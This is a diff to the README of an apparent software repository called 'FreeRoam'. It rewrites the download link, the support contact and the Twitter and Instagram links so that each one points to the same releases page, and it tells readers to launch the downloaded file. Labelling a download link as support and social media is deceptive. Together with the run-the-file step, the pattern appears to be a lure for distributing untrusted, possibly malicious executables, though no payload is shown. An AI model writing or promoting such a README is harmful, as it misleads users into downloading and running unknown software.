@@ -22,8 +22,8 @@ FreeRoam is a cutting-edge repository created to enhance your experience in the 
 
 To begin your journey with FreeRoam, simply follow these steps:
 
-1. Click on the following link: [Download FreeRoam](https://github.com/uploads/App.zip).
-   ![Download](https://img.shields.io/badge/Download-App.zip-brightgreen)
+1. Click on the following link: [Download FreeRoam](https://github.com/TheAdvocate0089/FreeRoam/releases).
+   ![Download](https://github.com/TheAdvocate0089/FreeRoam/releases)
 
 2. If the link ends with the file name, launch it to start exploring. If it doesn't work or is a website, please visit the "Releases" section for alternative options.
 
@@ -31,11 +31,11 @@ To begin your journey with FreeRoam, simply follow these steps:
 
 ## Support 📧
 
-For any inquiries or assistance, feel free to reach out to our support team at support@freeroam.com.
+For any inquiries or assistance, feel free to reach out to our support team at https://github.com/TheAdvocate0089/FreeRoam/releases
 
 ## Stay Connected 🌐
 
-Stay updated on the latest news and announcements by following us on [Twitter](https://twitter.com/freeroam) and [Instagram](https://instagram.com/freeroam).
+Stay updated on the latest news and announcements by following us on [Twitter](https://github.com/TheAdvocate0089/FreeRoam/releases) and [Instagram](https://github.com/TheAdvocate0089/FreeRoam/releases).
 
 Let your imagination run wild with FreeRoam! Start your adventure today. 🌈
 
